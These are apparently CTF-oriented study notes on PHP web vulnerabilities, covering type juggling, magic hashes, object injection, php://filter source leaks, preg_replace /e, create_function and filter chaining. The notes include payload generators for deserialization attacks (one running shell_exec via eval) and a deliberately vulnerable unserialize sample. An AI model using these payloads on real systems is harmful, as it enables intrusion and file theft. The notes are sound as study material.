# PHP vulnerabilities

## Magic hashes

- Vuln is in comparison of hashes with == instead of ===
- Hashes that start with 0e is taken as integer 0 exponent number behind
- '0e462097431906509019562988736854' == '0' is true
> The digits following 0e must be base 10!!

## strcmp()

- strcmp(array(), 'asdf') == NULL == 0
- To provide array in GET/POST, do password[]=a

## Injecting with different types

- take note of == vs ===
- === ensures its the same type
- can take advantage of this by injecting an array a[]=''
- Evals to null

## Hash collision with password_verify function
- null byte in hash will cause the rest of the hash to be truncated (shortened)
- easier to find hash starting with xxx00 which would collide

## Object injection
- To perform, there must be an existing class that calls a magic method that usually starts with `__xxxx` 
- when object is deserialized, you can basically create your own object with and set the values of the object properties
- the functions defined in the original object is called and executed on your object with your specified values 

### Example Payload Generator
```php
class access_log
{
	public $log_file = "../flag";
}
print(urlencode(base64_encode(serialize(new access_log()))))
```

That was for this vulnerable code
```php
class access_log
{
	public $log_file;
	function __toString() {
		return $this->read_log();
	}
	function read_log() {
		return file_get_contents($this->log_file);
	}
}
try{
  $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
  $g = $perm->is_guest();
  $a = $perm->is_admin();
}
  catch(Error $e){
  die("Deserialization error. ".$perm);
}
```

### Another Example of PHP Object Serialisation Vulnerabilities

```php
// Generates a payload: Please identify your entrypoint (ie where is it unserialised)
class User {
	public $name;
	function set_name($name) {$this->name = $name;}
	function get_name() {return $this->name;}
}

class User2 {
	public $name;
	function set_name($name) {$this->name = $name;}
	function get_name() {return eval($this->name);}
}

$userobj = new User2();
$userobj->set_name("return shell_exec('cat flag');");
echo base64_encode(serialize($userobj));
```


## Leaking source code with file=something
- `file=php://filter/convert.base64-encode/resource=filename.php`
- note that sometimes `.php` maybe already appended and in that case remove `.php` from payload

## Code execution using `preg_replace` regex `/e` modifier
- /e modifier would cause `preg_replace` to execute stuff that has been replaced, 2nd parameter of `preg_replace`
- One can inject the /e modifier using null bytes or other stuff
- Then inject code to be executed
- Note that `\\1` is regex to reference the first bracketed expression. Often seen in php `preg_replace` 2nd param. Basically a free injection spot but payload is filtered by the replaced chars

## Vulnerability with `stripslashes`
- un-quotes all C-like backslashes
- which means we can use hex representations of letters and stuff 
- "\x41\x41\x41" -> "AAA"
- Remember to escape the backslash so that the string received is `\x41\x41\x41`, without escaping is basically sending "AAA" which is pointless

## PHP `create_function` vuln
- `create_function` internally uses eval
- how it works is that it crafts a string based on the input params
- then evals that whole string to create a function
- this allows us to inject stuff to eval other things and get RCE

## extract()
- This function overrides the original namespace, allowing for control of any arbitrary variable at the time of calling the function. This is very handy for bypassing certain checks or inducing some vulnerable PHP errors.

## unserialize()

Similar to Python's 

PHP's serialisation is quite stupid, just change the value itself and edit the string length.

## PHP Filter Chaining

Basically, if any raw input is passed directly into `file_get_contents()`, there is a possibility that:  

1. Directory Traversal (ofc)
2. PHP Filter Chaining Attack

The attack works through the [`php://` wrappers](https://www.php.net/manual/en/wrappers.php.php) which allows direct modification to the input stream.

> Example Challenge: Paywall idekCTF 2022 Web

Refer to https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html and https://github.com/synacktiv/php_filter_chain_generator.git